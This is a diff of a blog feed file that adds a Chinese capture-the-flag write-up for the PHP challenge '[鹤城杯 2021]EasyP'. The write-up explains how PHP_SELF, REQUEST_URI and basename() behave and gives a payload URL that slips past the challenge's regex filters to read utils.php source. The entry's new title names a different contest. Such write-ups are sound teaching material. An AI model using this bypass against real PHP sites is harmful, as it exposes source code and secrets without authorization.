@@ -4,13 +4,25 @@
   
   
   <entry>
-    <title></title>
+    <title>2024XTCTF牢牢记住，逝者为大</title>
     <link href="/2024/07/15/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DEasyP/"/>
     <url>/2024/07/15/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DEasyP/</url>
     
     <content type="html"><![CDATA[<p><strong>先上源码</strong><br>![]([鹤城杯 2021]EasyP&#x2F;1.png)<br>进来就看到一个post传参传guess我傻傻的看了半天不知道secret是啥，后来才知道是迷惑我的<br>然后就开始考虑正则了，先解释三个函数<br><code>$_SERVER[&#39;PHP_SELF&#39;]</code><br>这个是指代调用脚本的路径<br>比如说这个题目它的值就是&#x2F;index.php<br>如果你访问的是<br><a href="http://127.0.0.1/index.php/utils.php">http://127.0.0.1/index.php/utils.php</a><br>那么它的值就会是&#x2F;index.php&#x2F;utils.php<br><code>$_SERVER[&#39;REQUEST_URI&#39;]</code><br>这个跟上面那个函数的区别就是会把后面的参数内容也包含进去<br><code>basename</code><br>![]([鹤城杯 2021]EasyP&#x2F;2.png)<br>接下来就是要绕过正则了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125; <br>这个正则的意思是检查调用脚本的路径末尾是不是utils.php，比如你的脚本<br>路径是aaa/bbbb那么路径末尾就是最后一个/后面的东西<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125; <br>这个正则就需要用到php的特性了  [  (空格)  + 　.<br>上面那几个字符任何一个都行，都可以被处理成_<br></code></pre></td></tr></table></figure><p>最后是关于basename的绕过了，这个函数有个特点<br>如果传入的参数中出现了非ascii字符则会把它给丢弃，中文就不是ascii字符</p><p>那么直接上payload<br>:::info<br><a href="http://node4.anna.nssctf.cn:28192/index.php/utils.php/%E5%85%83%E7%A5%9E%E8%BF%98%E6%98%AF%E5%8E%9F%E7%A5%9E?show.source=1">http://node4.anna.nssctf.cn:28192/index.php/utils.php/元神还是原神?show.source=1</a><br>:::<br>还有一个为什么要加一个index.php的问题<br>peekaboo大佬的wp里面：<br>为什么前面需要添加一个&#x2F;index.php呢<br>因为当我们传入index.php&#x2F;utils.php时，仍然请求的是index.php，<br>但是当basename()处理后，highlight_file()得到的参数就变成了utils.php，从而我们就实现了任意文件包含</p>]]></content>
     
     
+    <categories>
+      
+      <category>网络安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctfwp</tag>
+      
+    </tags>
     
   </entry>
   
